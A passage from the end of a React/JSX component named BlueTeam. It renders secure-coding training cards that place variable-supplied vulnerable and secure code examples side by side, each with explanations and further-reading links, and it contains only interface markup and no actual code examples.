                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <XCircle className="h-5 w-5 text-red-600" />
                                                    <h4 className="font-semibold text-lg">❌ Vulnerable Code</h4>
                                                </div>
                                                <pre className="p-4 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-900 rounded-lg overflow-x-auto text-sm font-mono">
                                                    {example.badCode}
                                                </pre>
                                                <Alert className="bg-red-50 dark:bg-red-950/20 border-red-200 dark:border-red-900">
                                                    <AlertTriangle className="h-4 w-4 text-red-600" />
                                                    <AlertTitle>Why this is vulnerable</AlertTitle>
                                                    <AlertDescription>
                                                        {example.badExplanation}
                                                    </AlertDescription>
                                                </Alert>
                                            </div>

                                            {/* Good Code */}
                                            <div className="space-y-3">
                                                <div className="flex items-center gap-2">
                                                    <CheckCircle2 className="h-5 w-5 text-green-600" />
                                                    <h4 className="font-semibold text-lg">✅ Secure Code</h4>
                                                </div>
                                                <pre className="p-4 bg-green-50 dark:bg-green-950/20 border border-green-200 dark:border-green-900 rounded-lg overflow-x-auto text-sm font-mono">
                                                    {example.goodCode}
                                                </pre>
                                                <Alert className="bg-green-50 dark:bg-green-950/20 border-green-200 dark:border-green-900">
                                                    <CheckCircle2 className="h-4 w-4 text-green-600" />
                                                    <AlertTitle>Why this is secure</AlertTitle>
                                                    <AlertDescription>
                                                        {example.goodExplanation}
                                                    </AlertDescription>
                                                </Alert>
                                            </div>

                                            {/* References */}
                                            <div>
                                                <h4 className="font-semibold mb-2 flex items-center gap-2">
                                                    <BookOpen className="h-4 w-4" />
                                                    Further Reading
                                                </h4>
                                                <ul className="space-y-1">
                                                    {example.references.map((ref, idx) => (
                                                        <li key={idx} className="text-sm text-blue-600 dark:text-blue-400">
                                                            • {ref}
                                                        </li>
                                                    ))}
                                                </ul>
                                            </div>
                                        </CardContent>
                                    )}
                                </Card>
                            );
                        })}
                    </div>
                </TabsContent>
            </Tabs>
        </div>
    );
};

export default BlueTeam;
